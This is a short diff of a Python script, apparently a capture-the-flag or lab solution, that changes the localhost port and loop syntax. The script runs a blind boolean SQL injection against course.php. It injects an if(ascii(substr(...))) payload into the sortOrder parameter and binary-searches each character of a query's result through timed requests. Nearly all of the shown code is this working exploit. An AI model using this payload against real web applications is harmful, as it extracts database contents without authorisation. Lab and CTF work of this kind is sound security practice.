@@ -1,7 +1,7 @@
 import requests
 import time
 
-url = "http://127.0.0.1:12321/course.php"
+url = "http://127.0.0.1:52449/course.php"
 param = {'sortOrder' : ''}
 
 payload = 'if(ascii(substr(({sql}),{pos},1))>{ascii}, 1, name)'
@@ -17,7 +17,7 @@ while len(result) != reslen:
     reslen = len(result)
     low, high = 32, 128
     mid = (low + high)//2
-    while(low < high):
+    while low < high:
         param['sortOrder'] = payload.format(sql=sql_query, pos=reslen+1, ascii=mid)
         res = requests.get(url=url, params=param)
         time.sleep(0.04)
